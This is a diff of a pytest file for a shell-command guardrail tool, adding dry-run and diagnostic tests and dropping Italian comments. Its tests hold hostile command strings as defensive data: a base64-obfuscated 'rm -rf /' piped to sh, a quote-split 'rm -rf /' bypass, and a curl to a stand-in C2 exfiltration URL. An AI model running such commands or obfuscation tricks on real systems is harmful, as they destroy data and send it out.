@@ -6,6 +6,8 @@ from guardrail_cli.parser import ASTBashParser
 from guardrail_cli.antitamper import AntiTamperEngine
 from guardrail_cli.network import NetworkEgressGuard
 from guardrail_cli.diagnostics import SystemDiagnosticEngine
+from guardrail_cli.simulator import DryRunSimulator
+from guardrail_cli.doctor import GuardrailDoctor
 
 @pytest.fixture
 def guardrail():
@@ -16,9 +18,21 @@ def guardrail():
 def diagnostic_engine():
     return SystemDiagnosticEngine()
 
+def test_dry_run_simulator_rm():
+    sim = DryRunSimulator()
+    analysis = sim.analyze("rm -rf /nonexistent_folder_abc")
+    assert not analysis.is_safe
+    assert analysis.risk_level == RiskLevel.WARNING
+    assert "Cancellazione ricorsiva" in analysis.intent_summary
+
+def test_guardrail_doctor():
+    doctor = GuardrailDoctor()
+    report = doctor.run_diagnostics()
+    assert report.overall_healthy
+    assert len(report.checks) >= 4
+
 def test_anti_tamper_base64_pipe():
     engine = AntiTamperEngine()
-    # echo 'cm0gLXJmIC8=' | base64 -d | sh
     cmd = 'echo "cm0gLXJmIC8=" | base64 -d | sh'
     res = engine.inspect(cmd)
     assert res.is_obfuscated
@@ -26,25 +40,21 @@ def test_anti_tamper_base64_pipe():
     assert "rm -rf /" in (res.decoded_command or "")
 
 def test_anti_tamper_quote_insertion(guardrail):
-    # Tentativo di bypass con apici spezzati r''m -''rf /
     cmd = "r''m -''rf /"
     res = guardrail.evaluate(cmd)
     assert not res.allowed
     assert res.risk_level == RiskLevel.BLOCKED
 
 def test_network_egress_guard():
-    # Test rete permessa (locale)
     guard = NetworkEgressGuard(block_external_egress=True, allowed_domains=["github.com"])
     res_local = guard.check("curl http://localhost:8080/api")
     assert res_local.allowed
     assert not res_local.is_external
 
-    # Test rete permessa (whitelist)
     res_wl = guard.check("curl https://github.com/francaroscillidev-gif")
     assert res_wl.allowed
     assert res_wl.is_external
 
-    # Test rete non permessa (bloccata)
     res_blocked = guard.check("curl https://malicious-c2-server.com/exfiltrate")
     assert not res_blocked.allowed
     assert res_blocked.is_external
